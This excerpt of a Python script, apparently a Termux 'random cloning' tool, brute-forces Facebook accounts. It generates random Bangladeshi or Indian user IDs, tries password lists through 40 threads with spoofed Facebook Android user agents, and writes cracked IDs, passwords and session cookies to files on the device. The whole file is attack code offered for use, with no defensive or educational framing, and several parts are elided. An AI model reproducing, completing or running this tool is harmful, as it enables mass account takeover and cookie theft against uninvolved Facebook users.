...
{G3}██ ██  ██ ███████ ██████  ███████ 
{G4}██  ██ ██ ██ ✓ ██ ██ 🔥   ██ ✓ ██ 
{G5}██   ████ ██   ██ ██      ██   ██ 卝{R}E{G1}X{X}T{M}R{S}A{Y} ツ
{W}{47*'-'}
{xd} DEVELOPER {R}:{G} SILENT KILLER
{xd} TOOLS     {R}:{G} RANDOM CLONE
{W}{47*'-'}'''
#---------------------[ MAIN MENU ]---------------------#
def NAPA():
    clear();print(f'{xd1} BANGLADESH RANDOM CLONING ');print(f'{xd2} INDIA RANDOM CLONING  ');print(f'{xd0} EXIT TOOLS ');linex();option = input(f'{xdx} SELECTION {R}:{G} ')
    if option in ["1"]:os.system;napa.append('1');randomxmenu()
    elif option in ["2"]:os.system;napa.append('2');randomxmenu()
    elif option in ["0"]:exit()
...
def randomxmenu():
    ...
    clear();print(f"{xd1} METHOD M1 {R}|{G}HOST{R}| ");print(f"{xd2} METHOD M2 {R}|{G}GRAPH{R}| ");linex();method=input(f'{xdx} ENTER METHOD {R}:{G} ')
    ...
    with ThreadPool(max_workers=40) as ____napa____:
        clear();tl = str(len(user))
        print(f'{xd} CODE{R}|{G}UID {R}:{W} {code}{R}|{W}{tl} ');print(f"{xd} IF NO RESULT ON{R}|{G}OFF AIRPLANE MODE");print(f'{xd} YOUR CLONING STARTED');linex()
        for love in user:
            ids = code + love 
            ...
            if method in ['1']:____napa____.submit(methodA,ids,pasx,tl)
            elif method in ['2']:____napa____.submit(methodB,ids,pasx,tl)
...
def methodA(ids,pasx,tl):
    ...
    sys.stdout.write(f'\r\r{xd}-{R}[{G}NAPA-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}]{ids} ');sys.stdout.flush()
    for pw in pasx:
        try:
            ...
            Update = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/513.1.0.66.92;FBBV/461627716;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
            data = {
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                if 'LIVE' in response:
                    print(f"\r{xd}-{R}[{G}NAPA-OK{R}]{G} {uid} | {pw} ")
                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                    open('/sdcard/NAPA-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
                    ok+=1
                    break
                else:continue
...
def sex():
	...
	height = random.choice(["720", "1080", "1280", "1440", "2340"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Robi;FBMF/Xiaomi;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/A5 Pro ;FBSV/15;FBOP/1;FBCA/arm64-v8a:]"
	return ua
...
#---------------------[ RANDOM METHOD B ]---------------------#
def methodB(ids,pasx,tl):
        global loop,ok,cp
        sys.stdout.write(f'\r\r{xd}-{R}[{G}NAPA-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}]{ids} ');sys.stdout.flush()
        try:
                for pw in pasx:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'LIVE' in response:
                                            print(f"\r{xd}-{R}[{G}NAPA-OK{R}]{G} {uid} | {pw} ")
                                            print(f"\r {R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")
                                            open('/sdcard/NAPA-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                            ok.append(str(uid))
                                            break
                                        else:continue
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        print(f"\r{xd}-{R}[{Y}NAPA-Ok.{R}]{Y} {uid} | {pw} ")
                                        open('/sdcard/NAPA-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                                        ok.append(str(uid))
                                        break
                        else:continue
                loop+=1
